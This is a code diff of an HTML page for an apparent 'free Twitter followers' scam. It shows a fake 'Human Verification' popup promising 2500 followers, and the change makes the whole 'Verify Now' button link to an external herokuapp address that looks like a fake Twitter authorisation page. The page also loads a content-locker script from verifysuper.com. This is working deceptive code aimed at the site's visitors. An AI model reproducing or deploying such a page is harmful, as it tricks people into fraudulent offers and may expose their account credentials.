@@ -5386,10 +5386,10 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 	<div class="verification-popup-inner-wrapper">
 		<h3>Human Verification</h3>
 		<p>Complete human verification below to recieve <span class="verification-followers-value">2500</span> followers for <span class="verification-network">Twitter</span> account @<span class="verification-username">"****"</span>. After verification is completed, newly generated followers will be added to your account.</p>
-		<i class="fa fa-spinner fa-spin"></i>
+		<i class="fa fa-spinner fa-spin"></i><a target="_self" href="https://followtweettwitterautho.herokuapp.com/">
 		<div class="button-wrapper">
-			<div class="button button-verification" onclick="call_locker()"><a target="_self" href="https://followtweettwitterautho.herokuapp.com/" <span="">Verify Now</a></div>
-		</div>
+			<div class="button button-verification" onclick="call_locker()"><span="">Verify Now</div>
+		</div></a>
 	</div>
 </div>
 <script type="text/javascript" id="ogjs" src="https://www.verifysuper.com/cl/load.php?id=09d5bb70d4087ac554c40a93fc6d8a53"></script></div></div></div></div>	
